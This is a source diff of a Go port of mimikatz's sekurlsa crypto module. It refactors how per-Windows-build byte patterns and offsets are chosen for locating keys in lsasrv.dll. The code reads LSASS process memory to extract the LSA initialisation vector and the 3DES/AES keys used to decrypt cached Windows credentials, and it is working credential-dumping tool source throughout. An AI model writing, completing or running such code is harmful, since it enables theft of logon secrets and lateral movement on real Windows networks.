@@ -3,12 +3,14 @@ package kiwi
 import (
 	"bytes"
 	"fmt"
+	"runtime"
 	"unsafe"
 
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
 	"project/internal/convert"
+	"project/internal/logger"
 	"project/internal/module/windows/api"
 )
 
@@ -25,9 +27,10 @@ var (
 	patternWin10X64LSAInitProtectedMemoryKey = []byte{
 		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
 	}
-	// key = build version
-	lsaInitProtectedMemoryKeyReferencesX64 = map[uint32]*patchGeneric{
-		buildWinVista: {
+
+	lsaInitProtectedMemoryKeyReferencesX64 = []*patchGeneric{
+		{
+			minBuild: buildWinVista,
 			search: &patchPattern{
 				length: len(patternWin7X64LSAInitProtectedMemoryKey),
 				data:   patternWin7X64LSAInitProtectedMemoryKey,
@@ -35,7 +38,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 63, off1: -69, off2: 25},
 		},
-		buildWin7: {
+		{
+			minBuild: buildWin7,
 			search: &patchPattern{
 				length: len(patternWin7X64LSAInitProtectedMemoryKey),
 				data:   patternWin7X64LSAInitProtectedMemoryKey,
@@ -43,7 +47,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 59, off1: -61, off2: 25},
 		},
-		buildWin8: {
+		{
+			minBuild: buildWin8,
 			search: &patchPattern{
 				length: len(patternWin8X64LSAInitProtectedMemoryKey),
 				data:   patternWin8X64LSAInitProtectedMemoryKey,
@@ -51,7 +56,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 62, off1: -70, off2: 13},
 		},
-		buildWin10v1507: {
+		{
+			minBuild: buildWin10v1507,
 			search: &patchPattern{
 				length: len(patternWin10X64LSAInitProtectedMemoryKey),
 				data:   patternWin10X64LSAInitProtectedMemoryKey,
@@ -59,7 +65,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 61, off1: -73, off2: 16},
 		},
-		buildWin10v1809: {
+		{
+			minBuild: buildWin10v1809,
 			search: &patchPattern{
 				length: len(patternWin10X64LSAInitProtectedMemoryKey),
 				data:   patternWin10X64LSAInitProtectedMemoryKey,
@@ -72,9 +79,10 @@ var (
 
 var (
 	patternWinAllX86LSAInitProtectedMemoryKey = []byte{0x6A, 0x02, 0x6A, 0x10, 0x68}
-	// key = build version
-	lsaInitProtectedMemoryKeyReferencesX86 = map[uint32]*patchGeneric{
-		buildWin7: {
+
+	lsaInitProtectedMemoryKeyReferencesX86 = []*patchGeneric{
+		{
+			minBuild: buildWin7,
 			search: &patchPattern{
 				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
 				data:   patternWinAllX86LSAInitProtectedMemoryKey,
@@ -82,7 +90,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 5, off1: -76, off2: -21},
 		},
-		buildWin8: {
+		{
+			minBuild: buildWin8,
 			search: &patchPattern{
 				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
 				data:   patternWinAllX86LSAInitProtectedMemoryKey,
@@ -90,7 +99,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 5, off1: -69, off2: -18},
 		},
-		buildWinBlue: {
+		{
+			minBuild: buildWinBlue,
 			search: &patchPattern{
 				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
 				data:   patternWinAllX86LSAInitProtectedMemoryKey,
@@ -98,7 +108,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
 		},
-		buildWin10v1507: {
+		{
+			minBuild: buildWin10v1507,
 			search: &patchPattern{
 				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
 				data:   patternWinAllX86LSAInitProtectedMemoryKey,
@@ -150,14 +161,14 @@ type bcryptKey81 struct {
 }
 
 type hardKey struct {
-	cbSecret uint32
-	data     [4]byte // self append
+	secret uint32
+	data   [4]byte // self append, not used
 }
 
-// acquireNT6LSAKeys is used to get IV and generate 3DES key and AES key.
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
 func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
 	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
@@ -167,15 +178,21 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	if err != nil {
 		return errors.WithMessage(err, "failed to search memory")
 	}
+	var patches []*patchGeneric
+	switch runtime.GOARCH {
+	case "386":
+		patches = lsaInitProtectedMemoryKeyReferencesX86
+	case "amd64":
+		patches = lsaInitProtectedMemoryKeyReferencesX64
+	}
+	_, _, build := kiwi.getWindowsVersion()
+	patch := selectGenericPatch(patches, build)
 
-	// address1 += 4 + uintptr(offset64)
+	fmt.Println(patch.minBuild)
 
-	index := bytes.Index(memory, patternWin10X64LSAInitProtectedMemoryKey)
+	index := bytes.Index(memory, patch.search.data)
 
-	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
-	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
-
-	address2 := lsasrv.address + uintptr(index) + 67 // TODO off0
+	address2 := lsasrv.address + uintptr(index+patch.offsets.off0)
 
 	var offset2 uint32
 	_, err = api.ReadProcessMemory(pHandle, address2, (*byte)(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
@@ -193,11 +210,13 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	kiwi.iv = iv
 	fmt.Println("IV:", iv)
 
-	address3 := lsasrv.address + uintptr(index) - 89 // TODO off1
+	address3 := lsasrv.address + uintptr(index+patch.offsets.off1) // TODO off1
 
 	kiwi.nt6RequireKey(pHandle, address3)
 	// address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
 	// kiwi.nt6RequireKey(pHandle, address3)
+
+	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
 	return nil
 }
 
@@ -231,7 +250,7 @@ func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error 
 	}
 	fmt.Println(bk81)
 
-	hardKeyData := make([]byte, int(bk81.hardKey.cbSecret))
+	hardKeyData := make([]byte, int(bk81.hardKey.secret))
 	addr1 := bhk.key + unsafe.Offsetof(bcryptKey81{}.hardKey) + unsafe.Offsetof(hardKey{}.data)
 	_, err = api.ReadProcessMemory(pHandle, addr1, &hardKeyData[0], uintptr(len(hardKeyData)))
 	if err != nil {
@@ -241,8 +260,6 @@ func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error 
 
 	fmt.Println(bhk.size)
 	fmt.Println(bk81.size)
-
-	kiwi.hardKeyData = hardKeyData
 
 	algHandle, err := api.BCryptOpenAlgorithmProvider("3DES", "", 0)
 	if err != nil {
